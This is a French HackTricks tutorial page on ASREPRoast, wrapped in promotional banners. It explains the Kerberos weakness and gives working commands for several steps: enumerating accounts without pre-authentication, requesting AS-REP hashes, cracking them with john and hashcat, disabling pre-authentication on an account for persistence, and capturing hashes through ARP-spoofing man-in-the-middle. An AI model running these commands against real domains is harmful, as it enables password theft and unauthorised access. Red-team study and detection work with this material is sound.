# ASREPRoast

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates expérimentés et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les défis du piratage

**Actualités de piratage en temps réel**\
Restez à jour avec le monde du piratage en évolution rapide grâce aux actualités et aux informations en temps réel

**Dernières annonces**\
Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs pirates dès aujourd'hui !

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs qui ne disposent pas de l'**attribut requis de pré-authentification Kerberos**. Essentiellement, cette vulnérabilité permet aux attaquants de demander une authentification pour un utilisateur auprès du Contrôleur de Domaine (DC) sans avoir besoin du mot de passe de l'utilisateur. Le DC répond ensuite avec un message chiffré avec la clé dérivée du mot de passe de l'utilisateur, que les attaquants peuvent tenter de craquer hors ligne pour découvrir le mot de passe de l'utilisateur.

Les principaux prérequis pour cette attaque sont :

* **Absence de pré-authentification Kerberos** : Les utilisateurs ciblés ne doivent pas avoir cette fonctionnalité de sécurité activée.
* **Connexion au Contrôleur de Domaine (DC)** : Les attaquants ont besoin d'accéder au DC pour envoyer des demandes et recevoir des messages chiffrés.
* **Compte de domaine facultatif** : Avoir un compte de domaine permet aux attaquants d'identifier plus efficacement les utilisateurs vulnérables grâce à des requêtes LDAP. Sans un tel compte, les attaquants doivent deviner les noms d'utilisateur.

#### Énumération des utilisateurs vulnérables (nécessite des informations d'identification de domaine)

{% code title="Utilisation de Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Utilisation de Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Demande de message AS_REP

{% code title="Utilisation de Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Utilisation de Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
La technique de Roasting AS-REP avec Rubeus générera un 4768 avec un type de chiffrement de 0x17 et un type de préauthentification de 0.
{% endhint %}

### Craquage
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistance

Forcer **preauth** non requis pour un utilisateur pour lequel vous avez les permissions **GenericAll** (ou les permissions pour écrire des propriétés):

{% code title="Utilisation de Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Utilisation de Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast sans identifiants

Un attaquant peut utiliser une position de l'homme du milieu pour capturer des paquets AS-REP lorsqu'ils traversent le réseau sans avoir besoin de désactiver l'authentification préalable de Kerberos. Cela fonctionne donc pour tous les utilisateurs sur le VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nous permet de le faire. De plus, l'outil force les postes de travail clients à utiliser RC4 en modifiant la négociation Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Références

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de primes en bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les défis du hacking

**Actualités de Hacking en Temps Réel**\
Restez à jour avec le monde du hacking en constante évolution grâce aux actualités et aux informations en temps réel

**Dernières Annonces**\
Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui!

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
